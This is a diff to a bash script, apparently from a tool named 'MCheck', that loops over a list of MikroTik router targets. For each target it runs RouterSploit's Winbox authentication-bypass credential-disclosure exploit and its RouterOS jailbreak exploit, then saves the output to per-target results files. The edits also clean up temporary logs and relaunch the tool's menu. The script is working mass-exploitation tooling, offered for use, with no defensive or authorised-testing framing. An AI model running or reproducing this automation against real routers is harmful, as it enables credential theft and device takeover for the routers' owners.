@@ -62,20 +62,26 @@ rsf(){
 	for name in `cat /opt/MCheck/files/tiks_rsf.txt`
 		do
 			#winbox_auth_bypass_creds_disclosure
-			sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}" | tee winbox_${name}.log
+			sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}" | tee winbox.log
 			WINSAVE=$(cat winbox.log)
-			echo "${WINSAVE}" >> files/RSF_winbox.results
+			echo "${WINSAVE}" >> files/Winbox_${name}.results
+			rm winbox.log
 			# routeros_jailbreak
-			sudo python3.7 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}" | tee jailbreak_${name}.log
+			sudo python3.7 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}" | tee jailbreak.log
 			JAIL=$(cat jailbreak.log)
-			echo "${JAIL}" >> files/RSF_jailbreak.results
+			echo "${JAIL}" >> files/Jailbreak_${name}.results
+			rm jailbreak.log
 		done
+	cd /opt/MCheck
+	sudo ./run.sh
 }
 #MCheck Start
 echo -e "${LP}"
 figlet -f mini "MCheck"
 echo -e "${NC}"
+echo -e "${BRED}"
 python3 files/banner.py
+echo -e "${NC}"
 PS3='What tool would you like to use?'
 	options=("MikroTik Auto-EX" "Routersploit Vuln Check")
     select opt in "${options[@]}"
